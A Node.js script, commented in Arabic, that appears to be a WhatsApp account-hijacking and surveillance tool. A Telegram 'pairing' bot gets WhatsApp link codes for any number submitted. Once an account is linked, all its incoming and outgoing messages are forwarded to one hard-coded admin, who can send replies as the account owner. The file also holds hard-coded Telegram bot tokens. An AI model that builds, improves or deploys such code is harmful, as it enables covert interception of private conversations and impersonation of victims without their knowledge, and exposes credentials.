/**
 * 👑 WHATSAPP-TELEGRAM ULTRA BRIDGE (FIXED PAIRING EDITION)
 * --------------------------------------------------
 * حل مشكلة "تعذر ربط الجهاز" وتحديث إعدادات الأمان 2025
 */

const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    DisconnectReason, 
    fetchLatestBaileysVersion, 
    makeInMemoryStore,
    getContentType,
    Browsers,
    delay,
    downloadContentFromMessage
} = require("@whiskeysockets/baileys");
const { Telegraf, Markup, session } = require("telegraf");
const pino = require("pino");
const fs = require("fs-extra");
const path = require("path");

const CONFIG = {
    PAIRING_BOT_TOKEN: "8578288620:AAFVW35qKVRPHMmKrPacqejWlupE5OgM3qI", 
    MANAGER_BOT_TOKEN: "8584722590:AAHFV8u4XZlBPNJ0uD4bHVosXY71bP3hPA4",
    ADMIN_ID: "8510615418",
    SESSIONS_BASE_PATH: path.join(__dirname, "sessions_vault"),
};

fs.ensureDirSync(CONFIG.SESSIONS_BASE_PATH);

class WhatsAppBridge {
    constructor() {
        this.activeConnections = new Map();
        this.pairingBot = new Telegraf(CONFIG.PAIRING_BOT_TOKEN);
        this.managerBot = new Telegraf(CONFIG.MANAGER_BOT_TOKEN);
        this.store = makeInMemoryStore({ logger: pino({ level: "silent" }) });
        
        this.managerBot.use(session());
        this.init();
    }

    async init() {
        console.log("🚀 تشغيل النظام المحدث لحل مشاكل الربط...");
        this.setupBotHandlers();
        await this.restoreSessions();
        this.pairingBot.launch();
        this.managerBot.launch();
    }

    async restoreSessions() {
        if (!fs.existsSync(CONFIG.SESSIONS_BASE_PATH)) return;
        const folders = await fs.readdir(CONFIG.SESSIONS_BASE_PATH);
        for (const folder of folders) {
            if (folder.startsWith("user_")) {
                const phone = folder.replace("user_", "");
                this.createWhatsAppInstance(phone);
            }
        }
    }

    async createWhatsAppInstance(phone, telegramCtx = null) {
        const sessionDir = path.join(CONFIG.SESSIONS_BASE_PATH, `user_${phone}`);
        
        // إذا كان هناك محاولة ربط جديدة، نحذف المجلد القديم لتجنب تعارض الملفات
        if (telegramCtx && fs.existsSync(sessionDir)) {
            await fs.remove(sessionDir);
        }

        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
        const { version } = await fetchLatestBaileysVersion();

        const sock = makeWASocket({
            version,
            auth: state,
            logger: pino({ level: "silent" }),
            // تعديل المتصفح ليكون Chrome على نظام Windows (أكثر استقراراً للربط)
            browser: ["Ubuntu", "Chrome", "20.0.04"],
            printQRInTerminal: false,
            markOnlineOnConnect: true,
            connectTimeoutMs: 60000,
            defaultQueryTimeoutMs: 0,
            keepAliveIntervalMs: 10000
        });

        this.store.bind(sock.ev);
        this.activeConnections.set(phone, sock);

        // أهم تعديل: طلب الكود بعد التأكد من استقرار الاتصال
        if (telegramCtx && !sock.authState.creds.registered) {
            await delay(6000); // زيادة وقت الانتظار لضمان جاهزية السيرفر
            try {
                const code = await sock.requestPairingCode(phone);
                const prettyCode = code?.match(/.{1,4}/g)?.join('-') || code;
                await telegramCtx.replyWithHTML(`💎 <b>كود الربط المحدث</b>\n\nالرقم: <code>${phone}</code>\nالكود: <code>${prettyCode}</code>\n\n⚠️ إذا ظهر "تعذر الربط"، تأكد من إدخال الكود فور وصوله وتحديث الواتساب.`);
            } catch (err) {
                console.error(err);
                await telegramCtx.reply("❌ فشل طلب الكود. انتظر دقيقة وحاول مجدداً.");
            }
        }

        sock.ev.on('creds.update', saveCreds);

        sock.ev.on('connection.update', async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === 'close') {
                const reason = lastDisconnect?.error?.output?.statusCode;
                if (reason !== DisconnectReason.loggedOut) {
                    this.createWhatsAppInstance(phone);
                }
            } else if (connection === 'open') {
                this.notifyAdmin(`✅ <b>تم الربط بنجاح للرقم:</b> <code>${phone}</code>`);
            }
        });

        sock.ev.on('messages.upsert', async (m) => {
            if (m.type !== 'notify') return;
            for (const msg of m.messages) {
                if (!msg.message || msg.key.remoteJid === 'status@broadcast') continue;
                this.forwardToTelegram(phone, msg);
            }
        });
    }

    async forwardToTelegram(instancePhone, msg) {
        const jid = msg.key.remoteJid;
        const name = msg.pushName || "مجهول";
        const fromMe = msg.key.fromMe;
        const type = getContentType(msg.message);
        const text = msg.message?.conversation || msg.message?.extendedTextMessage?.text || msg.message[type]?.caption || "";

        const direction = fromMe ? "📤" : "📥";
        const layout = `${direction} <b>${name}</b> (<code>${jid.split('@')[0]}</code>)\n━━━━━━━\n${text || "[وسائط]"}`;

        const keyboard = Markup.inlineKeyboard([
            [Markup.button.callback("💬 رد", `reply:${instancePhone}:${jid}`)]
        ]);

        this.managerBot.telegram.sendMessage(CONFIG.ADMIN_ID, layout, { parse_mode: 'HTML', ...keyboard }).catch(e => {});
    }

    setupBotHandlers() {
        this.pairingBot.command('pair', async (ctx) => {
            const phone = ctx.message.text.split(' ')[1]?.replace(/[^0-9]/g, '');
            if (!phone) return ctx.reply("❌ أرسل الرقم دولياً.");
            await ctx.reply("⏳ جاري تهيئة الاتصال الآمن... انتظر 6 ثوانٍ للكود.");
            this.createWhatsAppInstance(phone, ctx);
        });

        this.managerBot.on('text', async (ctx) => {
            if (ctx.session?.activeReply) {
                const { phone, jid } = ctx.session.activeReply;
                const sock = this.activeConnections.get(phone);
                if (sock) {
                    await sock.sendMessage(jid, { text: ctx.message.text });
                    ctx.reply("✅ تم الإرسال.");
                    ctx.session = null;
                }
            }
        });

        this.managerBot.action(/reply:(.*):(.*)/, async (ctx) => {
            const [_, phone, jid] = ctx.match;
            ctx.session = { activeReply: { phone, jid } };
            ctx.reply(`أرسل ردك للرقم ${jid.split('@')[0]}:`);
        });
    }

    notifyAdmin(text) {
        this.managerBot.telegram.sendMessage(CONFIG.ADMIN_ID, text, { parse_mode: 'HTML' }).catch(() => {});
    }
}

new WhatsAppBridge();

